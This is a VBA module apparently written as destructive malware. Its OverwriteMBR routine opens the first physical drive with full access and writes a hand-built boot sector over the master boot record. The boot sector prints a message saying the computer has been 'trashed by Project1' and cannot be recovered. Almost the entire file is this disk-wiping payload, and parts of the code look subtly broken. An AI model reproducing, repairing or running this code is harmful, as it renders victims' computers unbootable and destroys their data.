Attribute VB_Name = "MBR"
'Partition'
Private Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, ByVal lpSecurityAttributes As Long, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
Private Declare Function WriteFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Any, ByVal nNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, ByVal lpOverlapped As Any) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long

Public Const GENERIC_READ = &H80000000
Public Const GENERIC_WRITE = &H40000000
Public Const GENERIC_EXECUTE = &H20000000
Public Const GENERIC_ALL = &H10000000
Public Const FILE_SHARE_READ = &H1
Public Const FILE_SHARE_WRITE = &H2
Public Const CREATE_NEW = 1
Public Const CREATE_ALWAYS = 2
Public Const OPEN_EXISTING = 3
Public Const OPEN_ALWAYS = 4
Public Const TRUNCATE_EXISTING = 5
Sub OverwriteMBR()
    Dim hFile As Long
    ReDim buffer(0 To 2097151) As Byte
    Dim bytesWritten As Long
    
buffer = Chr(&HE9) & Chr(&H0) & Chr(&H0) & Chr(&H31) & Chr(&HC0) & Chr(&H8E) & Chr(&HD8) & Chr(&HFC) & Chr(&HB8) & Chr(&H12) & Chr(&H0) & Chr(&HCD) & Chr(&H10) & Chr(&HBE) & Chr(&H27) & Chr(&H7C) & Chr(&HB3) & Chr(&H4) & Chr(&HE8) & Chr(&H3) & Chr(&H0) & Chr(&HE9) & Chr(&HFD) & Chr(&HFF) & _
Chr(&HB7) & Chr(&H0) & Chr(&HAC) & Chr(&H3C) & Chr(&H0) & Chr(&H74) & Chr(&H7) & Chr(&HB4) & Chr(&HE) & Chr(&HCD) & Chr(&H10) & Chr(&HE9) & Chr(&HF4) & Chr(&HFF) & Chr(&HC3) & Chr(&H59) & Chr(&H6F) & Chr(&H75) & Chr(&H72) & Chr(&H20) & Chr(&H63) & Chr(&H6F) & Chr(&H6D) & Chr(&H70) & _
Chr(&H75) & Chr(&H74) & Chr(&H65) & Chr(&H72) & Chr(&H20) & Chr(&H68) & Chr(&H61) & Chr(&H64) & Chr(&H20) & Chr(&H62) & Chr(&H65) & Chr(&H65) & Chr(&H6E) & Chr(&H20) & Chr(&H74) & Chr(&H72) & Chr(&H61) & Chr(&H73) & Chr(&H68) & Chr(&H65) & Chr(&H64) & Chr(&H20) & Chr(&H62) & Chr(&H79) & _
Chr(&H20) & Chr(&H50) & Chr(&H72) & Chr(&H6F) & Chr(&H6A) & Chr(&H65) & Chr(&H63) & Chr(&H74) & Chr(&H31) & Chr(&H2E) & Chr(&HA) & Chr(&HD) & Chr(&H50) & Chr(&H6C) & Chr(&H65) & Chr(&H61) & Chr(&H73) & Chr(&H65) & Chr(&H2C) & Chr(&H20) & Chr(&H69) & Chr(&H74) & Chr(&H27) & Chr(&H73) & _
Chr(&H20) & Chr(&H6E) & Chr(&H6F) & Chr(&H74) & Chr(&H20) & Chr(&H72) & Chr(&H65) & Chr(&H63) & Chr(&H6F) & Chr(&H76) & Chr(&H65) & Chr(&H72) & Chr(&H61) & Chr(&H62) & Chr(&H6C) & Chr(&H65) & Chr(&H20) & Chr(&H62) & Chr(&H79) & Chr(&H20) & Chr(&H73) & Chr(&H6F) & Chr(&H66) & Chr(&H74) & _
Chr(&H77) & Chr(&H61) & Chr(&H72) & Chr(&H65) & Chr(&H2E) & Chr(&HA) & Chr(&HD) & Chr(&H49) & Chr(&H66) & Chr(&H20) & Chr(&H79) & Chr(&H6F) & Chr(&H75) & Chr(&H20) & Chr(&H63) & Chr(&H61) & Chr(&H6E) & Chr(&H2C) & Chr(&H20) & Chr(&H79) & Chr(&H6F) & Chr(&H75) & Chr(&H20) & Chr(&H77) & _
Chr(&H69) & Chr(&H6C) & Chr(&H6C) & Chr(&H20) & Chr(&H63) & Chr(&H61) & Chr(&H6E) & Chr(&H27) & Chr(&H74) & Chr(&H20) & Chr(&H73) & Chr(&H74) & Chr(&H61) & Chr(&H72) & Chr(&H74) & Chr(&H20) & Chr(&H79) & Chr(&H6F) & Chr(&H75) & Chr(&H72) & Chr(&H20) & Chr(&H63) & Chr(&H6F) & Chr(&H6D) & _
Chr(&H70) & Chr(&H75) & Chr(&H74) & Chr(&H65) & Chr(&H72) & Chr(&H2E) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & _
Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & _
Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & _
Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & _
Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & _
Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & _
Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & _
Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & _
Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & _
Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & _
Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & _
Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & _
Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & _
Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & _
Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H55) & Chr(&HAA)

    hFile = CreateFile("\\.\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ or FILE_SHARE_WRITE, 0&, OPEN_EXISTING, 0&, 0&)
    WriteFile hFile, buffer(0), ubound(buffer)+1, bytesWritten, 0&
    CloseHandle hFile
End Sub
